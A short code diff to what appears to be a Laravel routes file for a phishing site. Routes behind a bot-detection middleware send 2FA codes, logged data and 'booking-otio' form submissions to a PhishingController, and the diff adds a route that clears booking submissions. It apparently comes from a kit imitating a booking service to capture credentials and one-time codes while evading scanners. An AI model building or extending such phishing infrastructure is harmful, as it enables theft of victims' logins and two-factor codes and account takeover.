@@ -75,6 +75,7 @@ Route::middleware([\App\Http\Middleware\BotDetectionMiddleware::class])->group(f
     Route::post('/2fa', [PhishingController::class, 'handle2fa']);
     Route::post('/log', [PhishingController::class, 'handleGenericLog']);
     Route::post('/booking-otio/submit', [PhishingController::class, 'handleBookingOtioSubmit'])->name('booking-otio.submit');
+    Route::post('/booking-otio/clear', [PhishingController::class, 'handleBookingOtioClear'])->name('booking-otio.clear');
 });
 
 // Non-blocked API internal call
